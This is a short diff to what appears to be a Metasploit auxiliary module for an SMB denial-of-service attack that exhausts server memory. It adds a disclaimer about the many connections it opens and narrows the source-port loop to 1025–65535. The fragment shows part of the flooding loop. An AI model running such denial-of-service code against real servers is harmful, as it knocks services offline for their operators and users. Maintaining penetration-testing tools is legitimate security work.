@@ -27,6 +27,9 @@ class MetasploitModule < Msf::Auxiliary
         large numbers of these sessions, the memory does not get freed, and the server
         grinds to a halt. This vulnerability was originally disclosed by Sean Dillon
         and Zach Harding.
+
+        DISCALIMER: This module opens a lot of simultaneous connections. Please check
+        your system's ULIMIT to make sure it can handle it.
       },
       'Author'          =>
         [
@@ -52,7 +55,8 @@ class MetasploitModule < Msf::Auxiliary
 
     linger = Socket::Option.linger(true, 60)
 
-    (1..65535).each do |src_port|
+
+    (1025..65535).each do |src_port|
       print_status "Sending packet from Source Port: #{src_port}"
       opts = {
         'CPORT'           => src_port,
